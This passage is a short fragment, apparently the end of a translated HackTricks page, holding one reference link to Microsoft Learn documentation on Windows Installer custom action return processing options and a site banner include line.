- [16] [Microsoft Learn - Custom Action dönüş işleme seçenekleri](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
